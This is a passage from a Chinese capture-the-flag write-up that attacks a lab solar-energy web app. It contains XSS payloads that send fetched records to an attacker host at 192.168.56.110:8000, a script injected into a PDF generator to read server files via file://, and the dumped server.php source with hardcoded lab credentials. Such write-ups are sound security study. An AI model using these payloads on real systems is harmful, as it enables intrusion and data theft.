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"}
```

![图 69](../assets/images/f62fe42c29db41a9634c3bba5aebb4a7d9328180de80848fca7f03ea33bac8f9.png)  
![图 71](../assets/images/4fc60d4444965d2158f263c34b0e86c4473ba284f1e0416fb0857c3564ec08e4.png)  

![图 70](../assets/images/2ac7d0c578ccdbb4d5114e93347e725f1511c80ba52b010dc7eaedd9cc2fd14c.png)  
![图 72](../assets/images/54f34034bd3a6c62885fa5d62a35b2aa7d25abacbfc85f56c25a6b1dec0fcc2d.png)  


```
"<img src=x onerror=\"(async () => { location.href='http://192.168.56.110:8000/?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/')).arrayBuffer())));})(); \" />"

"<img src=x onerror=\"(async () => {location.href='http://192.168.56.110:8000?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/?download=true&file=2024-09-02T23%3A29%3A26.645Z.json')).arrayBuffer())));})();\" />"
```

![图 73](../assets/images/e8f05083e596e0589dc35973cdd1de8b7cf3203728d928bf7b0a52aec94fcdc4.png)  
![图 74](../assets/images/0fc660749503e41bf731cd0566e568acd57bf9ecd04c83f9e8a58fd637a376da.png)  




```
<!DOCTYPE html>
<html>

<head>
    <title>List of Solar Energy Data</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="/style3.css">
</head>

<body>
    <div style="min-width:400px;background:white;padding:15px;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);">
        <div style="text-align:center;"><object class="solar-icon" data="../sun.svg" type="image/svg+xml" style="width:75px;"></object></div>
        <h1>List of Solar Energy Data</h1>
        <table>
            <tr>
                <th>Record</th>
                <th>Actions</th>
            </tr>
                            <tr>
                    <td>2024-09-02T23:15:11.396Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A15%3A11.396Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:18:15.742Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A18%3A15.742Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:18:44.091Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A18%3A44.091Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:24:33.828Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A24%3A33.828Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:24:44.800Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A24%3A44.800Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:25:15.961Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A25%3A15.961Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2024-09-02T23:29:14.124Z</td>
                    <td>
                        <a href="?download=true&file=2024-09-02T23%3A29%3A14.124Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2025-02-21T21:34:50.691Z</td>
                    <td>
                        <a href="?download=true&file=2025-02-21T21%3A34%3A50.691Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                            <tr>
                    <td>2025-02-21T21:44:15.783Z</td>
                    <td>
                        <a href="?download=true&file=2025-02-21T21%3A44%3A15.783Z.json" class="download-btn">Download PDF</a>
                    </td>
                </tr>
                    </table>
        <a href="../dashboard.php" class="logout-link">&lt; Back</a>
    </div>
</body>

</html>
```

![图 75](../assets/images/14c0a08b38895b87a44da635c90c53e4b1451a50f2aa3c16fc7ccbdaeda8766c.png)  
![图 76](../assets/images/62f843899892bd7dee514b516640e1a53998f4b12aa792979ccf2fc04d6bc537.png)  
![图 77](../assets/images/f127e680b891f4e4957187709ccfc44fce1a8e403a991e137ae4c924de8899e7.png)  

```
"\"><script>\np='/var/www/solar.nyx/records/index.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
```

![图 78](../assets/images/411f6699497c0e7b3034b9dcd658865fa42a3625b72c3e67efb8d39df8ee126b.png)  
![图 79](../assets/images/13425093e49ef552da8eb4162b22c7bd4205a1a8a2973ea9600316e5db82acdc.png)  

![图 80](../assets/images/a8707bba913119e0fe39e621e94b9382c21b6f1f01dc8dc5380833647400ff8c.png)  

![图 81](../assets/images/54e79aef71921ea0beaa374ccb6abdbd145bb2c722572a316361bbb8fcb94930.png)  



```
                        <a href="?download=true&file=2025-02-21T21%3A56%3A21.634Z.json" class="download-btn">Download PDF</a>
```

![图 82](../assets/images/18cc7bb293bd437c44d8649e4229518edae05fd9ab77bac7dc85ccfb2471128a.png)  
![图 83](../assets/images/a2e97c7dcac0ddf1f0b93b2b631516bbd227c1aa795584ce587956e1fdeaaf60.png)  

>到这你就已经完成了前面xss的准备工作现在只需要进行Lfi读取文件了，这里可以看到我们拿回来的index,现在我直接跳过一个一个Lfi查找文件直接查找sunfriends.nyx/server.php
>


```
{
  "time": "2025-02-21T21:34:50.574Z",
  "user": {
    "name": "JulianAdm",
    "role": "admin"
  },
  "solar": 235,
  "consumed": 132,
  "grid": -103,
  "chart": "\"><script>\np='/var/www/sunfriends.nyx/server.php';\nx=new XMLHttpRequest;\nx.onerror=function(){{document.write('<p>'+p+' not found')}};\nx.onload=function(){{document.write('<p>'+p+'</p><div style=\"word-break: break-all;max-width:90%;\">'+btoa(this.responseText)+'</div>')}};\nx.open(\"GET\",\"file://\"+p);x.send();\n</script><x=\""
}

"<img src=x onerror=\"document.querySelector(`#send-record-id`).dispatchEvent(new Event('click'));\" />"

"<img src=x onerror=\"(async () => { location.href='http://192.168.56.110:8000/?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/')).arrayBuffer())));})(); \" />"

"<img src=x onerror=\"(async () => {location.href='http://192.168.56.110:8000?data='+btoa(String.fromCharCode(...new Uint8Array(await (await fetch('/records/?download=true&file=2024-09-02T23%3A29%3A26.645Z.json')).arrayBuffer())));})();\" />"

```

![图 84](../assets/images/dfbe7a990d0bbf5cc7a52273a5fd40f3363f3861767281f46234e67f8e6f5489.png)  
![图 85](../assets/images/aba7e4e8863357196f7d94cf859ae6dd03aa767306e36565b51644027c02a2a8.png)  
![图 86](../assets/images/db1a0e34ab6e95b20ba91f5ffc57342536aaf709e3f7bfa6c04007cadaac25ea.png)  
![图 87](../assets/images/55566f42d4e59ed49a2edd0e213f30238a082cda0add67005279261475811421.png)  


```
<?php
$secure = true;
$httponly = true;
$samesite = 'Strict';
$secret = [
    'user' => '5up3r',
    'pass' => 'bloods'
];

if (PHP_VERSION_ID < 70300) {
    session_set_cookie_params($maxlifetime, '/; samesite=' . $samesite, $_SERVER['HTTP_HOST'], $secure, $httponly);
} else {
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Verify credentials 
    if ($username === $secret['user'] && $password === $secret['pass']) {
        $_SESSION['loggedin'] = true;
        header('Location: server.php');
        exit;
    } else {
        $error = "Incorrect username or password.";
    }
}

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // Handle logout
    if (isset($_POST['logout'])) {
        session_destroy();
        header('Location: server.php');
        exit;
    }

    // Handle command execution
    if (isset($_POST['execute']) && isset($_POST['command_file'])) {
        $commandFile = 'commands/' . basename($_POST['command_file']);
        if (file_exists($commandFile)) {
            $commandJson = file_get_contents($commandFile);
            $command = json_decode($commandJson, true);

            if (isset($command['cmd'])) {
                $output = shell_exec(escapeshellcmd($command['cmd']));
                $mqttHost = 'localhost';
                $mqttTopic = 'server/command/output';
                $mqttMessage = json_encode([
                    'name' => $command['name'],
                    'command' => $command['cmd'],
                    'output' => base64_encode($output)
                ]);
                $mqttCommand = sprintf(
                    'mosquitto_pub -h %s -t %s -m %s -u '.$secret['user'].' -P \''.$secret['pass'].'\'',
                    escapeshellarg($mqttHost),
                    escapeshellarg($mqttTopic),
                    escapeshellarg($mqttMessage)
                );
                shell_exec($mqttCommand);
            } else {
                $output = "Invalid command format in the file.";
            }
        } else {
            $output = "Command file not found.";
        }
    }

    // Get list of command files
    $commandFiles = array_diff(scandir('commands'), ['.', '..', 'php-info.php']);

    // Show admin panel if user is authenticated
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <title>Admin Panel</title>
        <link rel="stylesheet" href="/style.css">
        <link rel="stylesheet" href="/styleadmin2.css">
    </head>

    <body>
        <main>
            <h1>Server Administration Panel</h1>
            <p>This is a server administration or management page.</p>
            <p style="text-align:left;">Server contains two websites:
            <ul>
                <li style="text-align:left;"><strong>sunfriends.nyx</strong> a forum about solar energy.</li>
                <li style="text-align:left;"><strong>solar.nyx</strong> a real time control panel for the community solar
                    installation.</li>
            </ul>
            </p>
            <form method="post" action="">
                <input type="submit" name="logout" value="Logout">
            </form>
            <h2>Server Information</h2>
            <form method="post" action="">
                <label for="command_file">Select Command:</label>
                <select name="command_file" id="command_file" required>
                    <?php foreach ($commandFiles as $file): ?>
                        <option value="<?php echo htmlspecialchars($file); ?>"><?php echo htmlspecialchars($file); ?></option>
                    <?php endforeach; ?>
                </select>
                <br><br>
                <input type="submit" name="execute" value="Execute">
            </form>
            <?php if (isset($output)): ?>
                <h3>Command Output:</h3>
                <pre><?php echo htmlspecialchars($output); ?></pre>
            <?php endif; ?>
        </main>
    </body>

    </html>
    <?php
} else {
    // Show login form if user is not authenticated
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login - Solar Community Server</title>
        <link rel="stylesheet" href="/style.css">
        <link rel="stylesheet" href="/styleadmin.css">

    </head>

    <body>
        <!-- Main container for the login form -->
        <div class="login-container">
            <!-- Page header -->
            <h2>Admin Login</h2>

            <!-- Subheader to clarify the purpose of the login -->
            <h3>Administration Server for <strong>solar.nyx</strong> and <strong>sunfriends.nyx</strong></h3>

            <!-- Display error message if present -->
            <?php if (isset($error)): ?>
                <p class="error"><?php echo $error; ?></p>
            <?php endif; ?>

